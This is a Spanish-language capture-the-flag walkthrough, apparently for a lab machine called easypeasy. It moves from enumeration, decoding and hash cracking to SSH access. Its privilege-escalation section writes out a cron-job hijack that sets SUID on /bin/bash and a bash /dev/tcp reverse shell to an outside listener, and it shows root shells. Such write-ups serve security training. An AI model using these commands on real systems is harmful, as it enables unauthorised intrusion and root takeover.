PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  Apache http

-Hay un servidor nginx en el puerto 80 y un servidor apache en el puerto 65524.
-Hacemos una enumeración web con gobuster para encontrar las 3 primeras flags que nos pide la ctf.

-La primera se encuentra en la ruta $IP/hidden/whathever , en el código fuente encontramos contenido en base64. Lo pegamos en la web que decodifica o hacemos el siguiente comando:

echo "ZmxhZ3tmMXJzN19mbDRnfQ== " | base64 -d

flag1: flag{f1rs7_fl4g} 

-La segunda se encuentra en la siguiente ruta: $IP:65524/robots.txt

User-Agent: a18672860d0510e5ab6699730763b250

Hacemos el siguiente proceso:

1. hashes.com: Web para identificar que tipo de hash es. En este caso es md5.
2. md5hashing.net: Web para descifrar hashes md5 entre otros.

flag2: flag{1m_s3c0nd_fl4g}

-La tercera se encuentra en el código fuente de la ruta $IP:65524/

Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}

Hay otro texto oculto en el código fuente de $IP:65524/ , que es: ObsJmP173N2X6dOrAgEAL0Vu
Nos vamos a la web Cypher identifier para saber en que está cifrado y descifrarlo.
Sale que está cifrado en base62 y el contenido descifrado es: /n0th1ng3ls3m4tt3r , que es la ruta oculta que te piden.

-En la web encontramos un hash que vamos a crackear con la wordlist que nos proporciona el ctf, el hash es de tipo gost, por lo que añadimos el formato gost a la herramienta john.

john --wordlist=~/Downloads/easypeasy_1596838725703.txt hash.txt --format=gost

mypasswordforthatjob (?)  

-En la ruta http://IP:65524/n0th1ng3ls3m4tt3r/ hay una imagen, nos la descargamos y aplicamos esteganografía incluyendo la contraseña (mypasswordforthatjob) como parafrase:

steghide extract -sf binarycodepixabay.jpg
password: mypasswordforthatjob

Obtenemos el archivo secrettext.txt que contiene un usuario y una contraseña en binario

username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

Convertimos la contraseña a texto mediante una web de conversion de binario a texto.
password: iconvertedmypasswordtobinary

-Accedemos a la máquina por ssh por el puerto 6498 ssh boring@IP -p 6498
password: iconvertedmypasswordtobinary

boring@kral4-PC:/tmp$ cat /home/boring/user.txt
User Flag But It Seems Wrong Like Its Rotated Or Something
synt{a0jvgf33zfa0ez4y}

La flag de user está rotada, por lo que nos vamos otra vez a la web de cipher identifier e introducimos la cadena.

Salen muchas opciones, pero como nos han dado la pista de que está rotada vamos a elegir la opción de Rot Cipher. Nos redirije a otra ventana, quitamos el texto que nos pone y volvemos a poner la flag: synt{a0jvgf33zfa0ez4y}. 

Filtramos: control + f: flag y nos aparece la flag de user descifrada.


## Escalada de Privilegios

-sudo -l: no tenemos permisos de sudo para nada.
-find / -perm /4000 2>/dev/null: No tenemos ningún permiso SUID interesante.

-Buscamos los permisos del grupo boring:
find / -group boring 2>/dev/null

Encontramos la siguiente tarea cron: 
/var/www/.mysecretcronjob.sh

Se puede hacer de dos maneras:
1-Lo editamos y otorgamos permisos SUID a la /bin/bash: Se puede hacer de 2 maneras tmb:
	- chmod +s /bin/bash
	- chmod 4755 /bin/bash
	- 
boring@kral4-PC:/var/www$ bash -p
bash-4.4# whoami
root

2-Lo editamos y nos mandamos una reverse shell a nuestra máquina:
	#!/bin/bash
	bash -c 'bash -i >& /dev/tcp/10.9.1.161/1234 0>&1'

nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.1.161] from (UNKNOWN) [10.10.186.102] 49188
root@kral4-PC:/var/www# 








